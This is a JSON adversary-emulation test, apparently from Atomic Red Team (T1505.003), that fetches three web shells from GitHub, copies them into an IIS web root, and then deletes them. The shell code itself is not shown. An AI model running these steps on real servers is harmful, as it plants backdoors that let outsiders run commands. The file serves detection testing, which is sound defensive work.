{
  "id": "0a2ce662-1efa-496f-a472-2fe7b080db16",
  "name": "Web Shell Written to Disk",
  "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "8e96c3e5-ab77-4d26-9495-72b91c8120e3",
      "type": "execute-command",
      "data": {
        "command": "xcopy /I /Y \"#{web_shells}\" #{web_shell_path}\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "1c21426b-1360-439b-a67b-bab17d2744ca",
      "type": "execute-command",
      "data": {
        "command": "del #{web_shell_path}\\b.jsp /q \u003enul 2\u003e\u00261\ndel #{web_shell_path}\\tests.jsp /q \u003enul 2\u003e\u00261\ndel #{web_shell_path}\\cmd.aspx /q \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "f0860c3b-bc89-483f-a9fd-b47fae0bb759",
      "name": "Check dependency 1/1",
      "description": "Web shell must exist on disk at specified location (#{web_shells})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "176a2aa9-d1b1-4b85-942f-449912b86a19",
      "name": "Resolve dependency 1/1",
      "description": "Web shell must exist on disk at specified location (#{web_shells})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"#{web_shells}\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp\" -OutFile \"#{web_shells}/b.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp\" -OutFile \"#{web_shells}/tests.jsp\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx\" -OutFile \"#{web_shells}/cmd.aspx\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "91a3fb67-72f9-45fe-8344-0ed9a907d253",
      "name": "Re-check dependency 1/1",
      "description": "Web shell must exist on disk at specified location (#{web_shells})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{web_shells}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "8e96c3e5-ab77-4d26-9495-72b91c8120e3",
      "p": "on-success",
      "o": "1c21426b-1360-439b-a67b-bab17d2744ca"
    },
    {
      "s": "8e96c3e5-ab77-4d26-9495-72b91c8120e3",
      "p": "on-failure",
      "o": "1c21426b-1360-439b-a67b-bab17d2744ca"
    },
    {
      "s": "f0860c3b-bc89-483f-a9fd-b47fae0bb759",
      "p": "on-success",
      "o": "8e96c3e5-ab77-4d26-9495-72b91c8120e3"
    },
    {
      "s": "f0860c3b-bc89-483f-a9fd-b47fae0bb759",
      "p": "on-failure",
      "o": "176a2aa9-d1b1-4b85-942f-449912b86a19"
    },
    {
      "s": "176a2aa9-d1b1-4b85-942f-449912b86a19",
      "p": "on-success",
      "o": "91a3fb67-72f9-45fe-8344-0ed9a907d253"
    },
    {
      "s": "91a3fb67-72f9-45fe-8344-0ed9a907d253",
      "p": "on-failure",
      "o": "8e96c3e5-ab77-4d26-9495-72b91c8120e3"
    }
  ],
  "tags": [
    "T1505.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "web_shell_path",
      "type": "string",
      "description": "The path to drop the web shell",
      "value": "C:\\inetpub\\wwwroot"
    },
    {
      "name": "web_shells",
      "type": "path",
      "description": "Path of Web Shell",
      "value": "PathToAtomicsFolder\\T1505.003\\src"
    }
  ]
}